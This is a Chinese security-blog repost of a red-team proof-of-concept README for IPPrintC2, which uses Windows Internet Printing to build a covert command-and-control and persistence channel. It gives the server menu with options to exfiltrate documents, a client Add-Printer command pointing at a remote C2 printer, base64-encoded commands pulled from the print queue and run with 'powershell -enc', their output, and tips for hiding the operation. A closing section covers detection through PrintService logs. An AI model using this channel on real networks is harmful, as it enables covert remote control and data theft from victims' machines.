#  使用 MS Windows 打印机通过互联网打印进行持久性/命令和控制的 PoC   
 Ots安全   2024-06-29 11:30  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
总结  
  
使用 Microsoft Windows 打印机通过互联网打印进行持久性/命令和控制的概念验证。  
  
打印系统是攻击者在受害者网络上建立命令和控制 (C2) 通道时经常忽视的目标。攻击者可以滥用操作系统的打印系统来添加和删除打印机，并创建和操纵打印作业以实现完整的 C2 通信。我们已经开发出这种解决方案的完整概念验证，并已在现实世界的红队演习中成功测试。通过了解这种特定的打印系统滥用所采用的方法，我们可以采取措施保护它们并防止它们被恶意行为者利用。  
  
背景故事  
  
其想法是使用内置的 Windows 功能创建一个用于交战的基本 C2，然后可以使用它来执行任意命令或加载首选的 C2 解决方案（https://howto.thec2matrix.com/）。  
  
使用了 Microsoft Windows 中的一项功能，该功能允许通过 Internet 打印协议 ( https://en.wikipedia.org/wiki/Internet_Printing_Protocol ) 安装共享打印机。只要没有安装驱动程序，普通用户无需管理权限即可添加打印机，因此必须使用现有驱动程序。使用了默认的“Microsoft Print to PDF”驱动程序。  
  
将要执行的命令以 base64 编码的文档名称的形式从 C2 Internet 打印服务器发送到打印机的文档队列。使用基本的 PowerShell，客户端可以从队列中获取这些文档名称并自行执行命令。此外，客户端可以将文档打印到此打印机，这些文档将保存到 C2 服务器上的文件中，这对于获取执行命令的结果或泄露文档很有用。另一个优点是，添加在 Internet 上共享的打印机可以通过企业中常用的几个 Web 代理解决方案。在 Windows Server 2019 和 Windows 10/11 上进行了测试。  
  
服务器  
  
设置 C2 服务器需要 Internet 信息服务、Windows 打印服务、打印服务器和 Internet 打印。Internet 信息服务启用了匿名身份验证，因此客户端无需身份验证即可获取文档队列，打印作业的所有者是 IUSR 用户帐户。服务器还为自己安装共享打印机，并使用它将作业提交到其打印队列，否则，文档所有者将不是 IUSR 用户，客户端将无法从队列中获取文档名称。  
  
此存储库中提供了安装脚本，应该可以使用。检查您是否可以访问打印机以确保一切顺利：  
```
http(s)://<IP or DNS>/printers/
http(s)://<IP or DNS>/printers/<printername>/.printer
```  
  
完成所有设置后，运行 IPPrintC2.ps1 并通过文档名称输入要在客户端上执行的命令。文档名称有其长度限制，因此如果文档名称中 base64 编码命令的长度大于 255 个字符，则会将其拆分为打印队列中的多个文档。这由 IPPrintC2 脚本处理，而串联则由客户端处理。  
```
PS C:\Users\administrator\Desktop> .\IPPrintC2.ps1
IPPrint C2 Server
1. Select the default C2 printer.
2. Enter the command to execute on the client through the document name.
3. Enter the path of the PowerShell script you would like to execute.
4. Exfiltrate remote documents.
5. Read IIS logs.
6. Clear the print queue.
7. Kill all clients.
8. Quit.
What do you want to do?: 2
To print output of multiple commands, use this: [scriptblock]$x={whoami;hostname;ipconfig};$x.invoke()
Enter commands you wish to execute: [scriptblock]$x={whoami /all;hostname};$x.invoke()
```  
  
您还可以加载 PowerShell 脚本。保持脚本简单，因为它们可能需要一段时间才能拆分并发送到文档队列。此外，脚本是一次性的，因为打印队列最终会被清除，并且字符限制为 32767。  
  
操作安全  
- 确保对目标网络段使用白名单方法，否则任何人都可以访问您的打印队列。  
  
- 出于显而易见的原因，建议设置 SSL。设置 SSL 的最简单方法：  
  
- 为你的虚拟机设置/生成 DNS 记录  
  
- https://certifytheweb.com/可用于自动化 CSR 和安装  
  
- 确保编辑 IIS 下的站点绑定以启用 HTTPS 并禁用 HTTP  
  
- https://docs.microsoft.com/en-us/iis/manage/configuring-security/how-to-set-up-ssl-on-iis  
  
客户端  
  
要在客户端执行命令，需要添加打印机和持久作业来获取和执行命令。示例：  
```
PS C:\Users\regular> Add-Printer XPS -PortName https://somewhere.on.azure.com/printers/af/.printer -DriverName "Microsoft Print To PDF"

PS C:\Users\regular> Get-Printer XPS |fl


Name                         : XPS
ComputerName                 :
Type                         : Local
ShareName                    :
PortName                     : https://somewhere.on.azure.com/printers/af/.printer
DriverName                   : Microsoft Print To PDF
Location                     :
Comment                      :
SeparatorPageFile            :
PrintProcessor               : winprint
Datatype                     : RAW
Shared                       : False
Published                    : False
DeviceType                   : Print
PermissionSDDL               :
RenderingMode                :
KeepPrintedJobs              : False
Priority                     : 1
DefaultJobPriority           : 0
StartTime                    : 0
UntilTime                    : 0
PrinterStatus                : Normal
JobCount                     : 0
DisableBranchOfficeLogging   :
BranchOfficeOfflineLogSizeMB :
WorkflowPolicy               :

PS C:\Users\regular> ((get-printjob XPS).documentname -join "")
WwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQAkAHgAPQB7AHcAaABvAGEAbQBpACAALwBhAGwAbAA7AGgAbwBzAHQAbgBhAG0AZQB9ADsAJAB4AC4AaQBuAHYAbwBrAGUAKAApAA==

PS C:\Users\regular> powershell -enc ((get-printjob XPS).documentname -join "")

USER INFORMATION
----------------

User Name               SID
======================= ==============================================
desktop-printingfun\regular S-1-5-21-1829223926-2430627930-1039442773-1002


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Performance Log Users          Alias            S-1-5-32-559 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

DESKTOP-PRINTINGFUN
```  
  
存储库中有多个可用有效载荷。  
  
检测  
  
与往常一样，最好的方法是集中监控安全运营中心/安全信息和事件管理解决方案上的基础设施日志，并使用命令行日志记录/PowerShell 转录。  
  
默认情况下，打印机安装不会记录在事件查看器中，但可以启用此功能：  
  
事件查看器 -> 应用程序和服务日志 -> Microsoft -> Windows -> PrintService，右键单击并启用操作日志  
```
https://social.technet.microsoft.com/Forums/windowsserver/en-US/8e7399f6-ffdc-48d6-927b-f0beebd4c7f0/enabling-quotprint-historyquot-through-group-policy?forum=winserverprint
```  
  
启用打印服务操作日志后，您可以使用事件 ID 300 和 307 监控打印机的安装和其他信息。  
```
Log Name:      Microsoft-Windows-PrintService/Operational
Source:        Microsoft-Windows-PrintService
Date:          6/28/2022 9:15:42 AM
Event ID:      300
Task Category: Adding a printer
Level:         Information
Keywords:      Classic Spooler Event,Printer
User:          DESKTOP-PRINTINGFUN\regular
Computer:      DESKTOP-PRINTINGFUN
Description:
Printer XPS was created. No user action is required.
Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PrintService" Guid="{747ef6fd-e535-4d16-b510-42c90f6873a1}" />
    <EventID>300</EventID>
    <Version>0</Version>
    <Level>4</Level>
    <Task>4</Task>
    <Opcode>11</Opcode>
    <Keywords>0x4000000000000820</Keywords>
    <TimeCreated SystemTime="2022-06-28T07:15:42.7786608Z" />
    <EventRecordID>6</EventRecordID>
    <Correlation />
    <Execution ProcessID="2512" ThreadID="2824" />
    <Channel>Microsoft-Windows-PrintService/Operational</Channel>
    <Computer>DESKTOP-PRINTINGFUN</Computer>
    <Security UserID="S-1-5-21-1829223926-2430127930-1039111773-1002" />
  </System>
  <UserData>
    <PrinterCreated xmlns="http://manifests.microsoft.com/win/2005/08/windows/printing/spooler/core/events">
      <Param1>XPS</Param1>
    </PrinterCreated>
  </UserData>
</Event>
```  
```
Log Name:      Microsoft-Windows-PrintService/Operational
Source:        Microsoft-Windows-PrintService
Date:          6/28/2022 11:15:16 AM
Event ID:      307
Task Category: Printing a document
Level:         Information
Keywords:      Classic Spooler Event,Document Print Job
User:          DESKTOP-PRINTINGFUN\regular
Computer:      DESKTOP-PRINTINGFUN
Description:
Document 4, Print Document owned by regular on \\DESKTOP-PRINTINGFUN was printed on XPS through port https://somewhere.on.azure.com/printers/printers/af/.printer.  Size in bytes: 69009. Pages printed: 1. No user action is required.
Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PrintService" Guid="{747ef6fd-e535-4d16-b510-42c90f6873a1}" />
    <EventID>307</EventID>
    <Version>0</Version>
    <Level>4</Level>
    <Task>26</Task>
    <Opcode>11</Opcode>
    <Keywords>0x4000000000000840</Keywords>
    <TimeCreated SystemTime="2022-06-28T09:15:16.1668381Z" />
    <EventRecordID>97</EventRecordID>
    <Correlation />
    <Execution ProcessID="2512" ThreadID="1848" />
    <Channel>Microsoft-Windows-PrintService/Operational</Channel>
    <Computer>DESKTOP-PRINTINGFUN</Computer>
    <Security UserID="S-1-5-21-1829223926-2430127930-1039111773-1002" />
  </System>
  <UserData>
    <DocumentPrinted xmlns="http://manifests.microsoft.com/win/2005/08/windows/printing/spooler/core/events">
      <Param1>4</Param1>
      <Param2>Print Document</Param2>
      <Param3>regular</Param3>
      <Param4>\\DESKTOP-PRINTINGFUN</Param4>
      <Param5>XPS</Param5>
      <Param6>https://somewhere.on.azure.com/printers/af/.printer</Param6>
      <Param7>69009</Param7>
      <Param8>1</Param8>
    </DocumentPrinted>
  </UserData>
</Event>
```  
  
文件  
- Install/InstallScript.ps1 - 安装先决条件的 PowerShell 脚本。你应该自己设置 SSL  
  
- Server/IPPrintC2.ps1 - 在托管打印服务的服务器上运行的 IPPrintC2 的 PowerShell 脚本  
  
- Payloads/payloads.txt - 入门所需的基本有效载荷列表  
  
笔记  
- C2 目前以一对多的方式工作。您可以在 C2 服务器上设置其他打印机，修改 IPPrintC2.ps1 脚本，并运行多个实例  
  
- 文档泄露功能需要改进，因为它目前适用于基于 ASCII 文本的文件  
  
- 客户打印文件的自动清理需要改进  
  
- IPPrintC2 按原样提供  
  
在编写这个简单的 C2 的过程中，我们发现 WithSecure 也使用了类似的技术，并且之前已经发布过。不仅如此，名称 (PrintC2) 也相同，因此将其更改为 IPPrintC2。尽管如此，由于存在差异以及不同的初始思维/目的，我们还是决定发布我们的工作。  
  
参考  
  
https://github.com/Diverto/IPPrintC2  
  
https://windows-internals.com/printdemon-cve-2020-1048/  
  
致谢  
  
作者：@kr3bz  
  
```
https://github.com/Diverto/IPPrintC2?tab=readme-ov-file#files
```  
  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  
